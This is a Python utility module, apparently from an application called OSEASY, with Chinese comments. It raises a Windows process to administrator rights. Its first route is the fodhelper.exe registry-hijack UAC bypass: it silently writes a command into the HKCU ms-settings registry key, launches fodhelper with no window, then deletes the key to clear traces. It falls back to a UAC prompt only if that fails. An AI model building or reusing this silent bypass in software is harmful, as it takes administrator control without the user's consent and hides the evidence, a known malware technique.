# src/utils/uac_elevator.py
# UAC 提权模块：自动检测权限并提权（优先静默绕过，失败回退弹 UAC）
#
# 使用方式:
#   from src.utils.system.uac_elevator import elevate
#   elevate(__file__)
#
# 提权后会在环境变量 OSEASY_PRIV_METHOD 中记录方式:
#   "bypass"    - Fodhelper 注册表绕过（静默）
#   "uac_dialog" - 标准 UAC 弹窗确认
#   "manifest"   - 打包 manifest 提权 / 原本就是管理员

import os
import sys
import ctypes
import subprocess

UAC_REG_PATH = r"Software\Classes\ms-settings\shell\open\command"
UAC_BYPASS_FLAG_FILE = "__uac_bypass__"
UAC_DIALOG_FLAG = "--uac-dialog"


def is_admin() -> bool:
    """检测当前进程是否以管理员权限运行"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def _try_bypass_uac(entry_script: str) -> bool:
    """
    尝试通过 fodhelper.exe 注册表劫持绕过 UAC。
    原理：fodhelper.exe 是系统信任程序，运行时自动提权且不弹 UAC。
    修改注册表指向我们的脚本，触发它执行。

    返回 True 表示成功触发，当前进程应立即退出。
    """
    if sys.argv[-1] == UAC_BYPASS_FLAG_FILE:
        return False  # 已经提过权，防止递归

    try:
        import winreg
    except ImportError:
        return False

    try:
        reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, UAC_REG_PATH)

        # 清空 DelegateExecute 让 fodhelper 走我们指定的命令
        winreg.SetValueEx(reg_key, "DelegateExecute", 0, winreg.REG_SZ, "")

        # 设置默认值为启动命令
        # 优先用 pythonw.exe（无控制台窗口），避免 fodhelper 提权时闪黑框
        python_exe = sys.executable
        pythonw_exe = python_exe.replace("python.exe", "pythonw.exe")
        if os.path.exists(pythonw_exe):
            python_exe = pythonw_exe
        cmd = f'"{python_exe}" "{os.path.abspath(entry_script)}" {UAC_BYPASS_FLAG_FILE}'
        winreg.SetValueEx(reg_key, "", 0, winreg.REG_SZ, cmd)

        winreg.CloseKey(reg_key)

        # 静默启动 fodhelper（隐藏 cmd 窗口）
        subprocess.Popen(
            r"C:\Windows\System32\fodhelper.exe",
            creationflags=subprocess.CREATE_NO_WINDOW,
        )

        # 尽快清理注册表
        _cleanup_registry()

        return True
    except Exception as e:
        print(f"[UAC] fodhelper bypass 异常: {e}")
        return False


def _cleanup_registry() -> None:
    """清理 fodhelper 注册表劫持痕迹"""
    try:
        import winreg
        reg_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, UAC_REG_PATH, 0, winreg.KEY_SET_VALUE
        )
        winreg.DeleteValue(reg_key, "DelegateExecute")
        winreg.DeleteValue(reg_key, "")
        winreg.CloseKey(reg_key)
    except Exception:
        pass


def _try_uac_dialog() -> None:
    """通过 ShellExecuteW(runas) 弹出标准 UAC 提权对话框"""
    try:
        argv = " ".join(f'"{a}"' if " " in a else a for a in sys.argv)
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable,
            f"{argv} {UAC_DIALOG_FLAG}", None, 1
        )
    except Exception:
        pass


def _set_priv_method() -> None:
    """根据命令行标记设置环境变量，记录本次提权方式"""
    if is_admin():
        if sys.argv[-1] == UAC_BYPASS_FLAG_FILE:
            os.environ["OSEASY_PRIV_METHOD"] = "bypass"
        elif UAC_DIALOG_FLAG in sys.argv:
            os.environ["OSEASY_PRIV_METHOD"] = "uac_dialog"
        else:
            os.environ["OSEASY_PRIV_METHOD"] = "manifest"


def elevate(entry_script: str) -> None:
    """
    自动提权入口。调用后若当前非管理员：
      1. 先尝试 fodhelper 静默绕过
      2. 失败则弹 UAC
      3. 都失败则继续以普通权限运行

    调用方在调用后应继续正常启动逻辑。

    :param entry_script: 入口脚本路径（通常传 __file__）
    """
    if is_admin():
        _set_priv_method()
        return

    # 方案 A：静默绕过
    if _try_bypass_uac(entry_script):
        sys.exit(0)

    # 方案 B：UAC 弹窗
    _try_uac_dialog()
    sys.exit(0)